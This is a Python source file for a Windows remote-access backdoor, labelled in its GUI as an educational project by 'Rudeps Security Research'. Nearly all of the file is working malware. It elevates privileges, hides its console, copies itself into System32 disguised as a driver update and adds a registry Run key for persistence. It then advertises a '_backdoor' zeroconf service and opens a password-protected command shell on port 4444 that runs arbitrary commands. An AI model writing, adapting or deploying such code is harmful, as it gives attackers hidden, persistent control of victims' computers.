import sys
import os
import shutil
import winreg
import socket
import threading
import subprocess
import ctypes
import time
from zeroconf import ServiceInfo, Zeroconf

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate_privileges():
    if not is_admin():
        script = os.path.abspath(sys.argv[0])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
        sys.exit(0)

def copy_to_system():
    current_file = os.path.abspath(sys.argv[0])
    system_dir = os.path.join(os.environ['SystemRoot'], 'System32')
    target_path = os.path.join(system_dir, "WindowsDriverUpdate.exe")
    
    if not os.path.exists(target_path):
        try:
            shutil.copy2(current_file, target_path)
        except:
            pass
    
    return target_path

def add_to_startup(target_path):
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "DriverUpdateService", 0, winreg.REG_SZ, target_path)
    except Exception:
        pass

def get_saved_code():
    return "AbC123"

def show_code_window(code):
    import tkinter as tk
    root = tk.Tk()
    root.title("System Diagnostics - Rudeps Research")
    root.geometry("400x200")
    root.resizable(False, False)
    
    label = tk.Label(root, text="System Connection Code:", font=("Arial", 12))
    label.pack(pady=10)
    
    code_label = tk.Label(root, text=f"{code}:4444", font=("Arial", 16, "bold"))
    code_label.pack(pady=5)
    
    info_label = tk.Label(root, text="For technical support contact administrator\nEducational cybersecurity project", font=("Arial", 9))
    info_label.pack(pady=5)
    
    signature = tk.Label(root, text="Rudeps Security Research", font=("Arial", 8), fg="gray")
    signature.pack(pady=5)
    
    root.mainloop()

class ZeroConfDiscovery:
    def __init__(self, code, port=4444):
        self.code = code
        self.port = port
        self.zeroconf = Zeroconf()
        self.service_info = None
        
    def advertise_service(self):
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            
            self.service_info = ServiceInfo(
                "_backdoor._tcp.local.",
                f"{self.code}._backdoor._tcp.local.",
                addresses=[socket.inet_aton(local_ip)],
                port=self.port,
                properties={'code': self.code, 'host': hostname},
            )
            
            self.zeroconf.register_service(self.service_info)
            return True
        except:
            return False
            
    def stop_advertising(self):
        if self.service_info:
            try:
                self.zeroconf.unregister_service(self.service_info)
            except:
                pass
        try:
            self.zeroconf.close()
        except:
            pass

class P2PBackdoor:
    def __init__(self, code):
        self.code = code
        self.port = 4444
        self.running = True
        self.zeroconf = ZeroConfDiscovery(code, self.port)
        
    def start_backdoor_server(self):
        if self.zeroconf.advertise_service():
            print("Zeroconf: Service advertised on local network")
        
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', self.port))
        server_socket.listen(5)
        server_socket.settimeout(1)
        
        print(f"Backdoor listening on port {self.port}")
        
        while self.running:
            try:
                client_socket, addr = server_socket.accept()
                print(f"Connection from {addr[0]}:{addr[1]}")
                threading.Thread(target=self.handle_client, args=(client_socket,), daemon=True).start()
            except socket.timeout:
                continue
            except:
                break
        
        server_socket.close()
        self.zeroconf.stop_advertising()

    def handle_client(self, client_socket):
        try:
            client_socket.settimeout(30)
            auth = client_socket.recv(1024).decode().strip()
            
            if auth == self.code:
                client_socket.send(b"AUTH_SUCCESS")
                time.sleep(0.1)
                self.handle_admin_session(client_socket)
            else:
                client_socket.send(b"AUTH_FAILED")
                client_socket.close()
                
        except:
            client_socket.close()

    def execute_command(self, command):
        try:
            command = command.strip()
            
            if command.lower() == 'ping':
                return "pong"
            elif command.lower() == 'calc':
                subprocess.Popen('calc.exe', shell=True)
                return "Calculator started"
            elif command.lower() == 'notepad':
                subprocess.Popen('notepad.exe', shell=True)
                return "Notepad started"
            elif command.lower() == 'cmd':
                subprocess.Popen('cmd.exe', shell=True)
                return "CMD started"
            elif command.lower() == 'exit':
                return "EXIT"
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                output = result.stdout + result.stderr
                return output if output else "Command executed successfully"
                
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {str(e)}"

    def handle_admin_session(self, client_socket):
        try:
            client_socket.send(b"Backdoor session started. Type 'exit' to quit.\n")
            
            while True:
                try:
                    client_socket.send(b"backdoor> ")
                    command_data = client_socket.recv(4096).decode().strip()
                    
                    if not command_data:
                        break
                        
                    if command_data.lower() == 'exit':
                        client_socket.send(b"Goodbye!\n")
                        break
                    
                    output = self.execute_command(command_data)
                    
                    if output == "EXIT":
                        break
                        
                    client_socket.send(output.encode() + b"\n")
                        
                except socket.timeout:
                    continue
                except ConnectionResetError:
                    break
                except Exception as e:
                    client_socket.send(f"Error: {str(e)}\n".encode())
                    break
                    
        except Exception as e:
            print(f"Session error: {e}")
        finally:
            client_socket.close()

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def main():
    elevate_privileges()
    hide_console()
    
    target_path = copy_to_system()
    add_to_startup(target_path)
    
    saved_code = get_saved_code()
    
    show_code_window(saved_code)
    
    backdoor = P2PBackdoor(saved_code)
    backdoor.start_backdoor_server()

if __name__ == "__main__":
    main()